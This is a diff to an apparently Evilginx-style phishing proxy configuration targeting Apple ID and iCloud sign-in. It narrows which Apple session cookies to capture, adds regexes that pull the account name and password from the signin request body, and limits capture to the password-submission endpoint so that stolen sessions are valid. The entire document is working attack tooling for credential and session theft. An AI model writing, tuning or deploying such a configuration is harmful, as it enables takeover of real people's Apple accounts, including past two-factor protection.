@@ -51,33 +51,35 @@ sub_filters:
   - {triggers_on: 'appleid.cdn-apple.com', orig_sub: '', domain: '', search: '(t\.getResponseHeader\("Location"\)\))', replace: '(new URL(t.getResponseHeader("Location")).pathname))', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
 
 
+# Session cookies to capture (be more specific to avoid false positives)
 auth_tokens:
   - domain: '.icloud.com'
-    keys: ['.*,regexp']
+    keys: ['X-APPLE-.*,regexp', 'DSID', 'acn01', 'aasp', 'acack']
   - domain: 'www.icloud.com'
-    keys: ['.*,regexp']
-  - domain: 'setup.icloud.com'
-    keys: ['.*,regexp']
+    keys: ['X-APPLE-.*,regexp', 'DSID', 'webKBSessionId']
   - domain: '.apple.com'
-    keys: ['.*,regexp']
+    keys: ['dslang', 'myacinfo', 'DES.*,regexp', 'JSESSIONID', 'aa_ack']
   - domain: 'idmsa.apple.com'
-    keys: ['.*,regexp']
+    keys: ['dslang', 'myacinfo', 'DES.*,regexp', 'JSESSIONID', 'acack']
 
+# Capture credentials from the signin POST request body
 credentials:
   username:
-    key: ''
+    key: 'accountName'
     search: '"accountName"\s*:\s*"([^"]*)'
     type: 'json'
   password:
-    key: ''
+    key: 'password'
     search: '"password"\s*:\s*"([^"]*)'
     type: 'json'
 
-# Apple ID authentication endpoints
+# IMPORTANT: Only capture on the actual signin endpoint (with password)
+# Do NOT include /federate as that's called before password entry
 auth_urls:
   - '/appleauth/auth/signin'
-  - '/appleauth/auth'
-  - '/appleauth/auth/federate'
+
+# Force POST method - only capture when credentials are actually submitted
+force_post: true
 
 login:
   domain: 'www.icloud.com'
